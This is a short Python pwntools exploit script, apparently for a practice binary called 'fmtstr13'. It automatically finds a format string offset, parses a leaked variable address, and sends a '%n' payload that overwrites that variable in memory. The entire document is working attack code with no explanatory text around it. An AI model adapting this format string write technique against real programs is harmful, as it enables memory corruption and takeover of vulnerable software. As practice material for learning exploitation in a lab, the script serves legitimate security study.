from pwn import *
context(arch = 'i386', os = 'linux', log_level='debug')

def fmt_str(payload):
	p = process('./fmtstr13')
	p.sendline(payload)
	return p.recvall()
	
autofmt = FmtStr(fmt_str)
offset = autofmt.offset
print "offset = " + hex(offset) 
p = process("./fmtstr13", stderr=PIPE)
print p.recvline() # print a
data = p.recvline()[0:10]
print data, type(data), len(data)
var_addr = int(data, 16)
var_addr = struct.pack(">I", var_addr)
var_addr = int(var_addr.encode("hex"), 16)
print "var addr = " + hex(var_addr)
payload = p32(var_addr) + "%96d%"+ str(offset) +"$n"
p.sendline(payload)
p.recvuntil("a")
print "a " + p.recvall()
p.close()


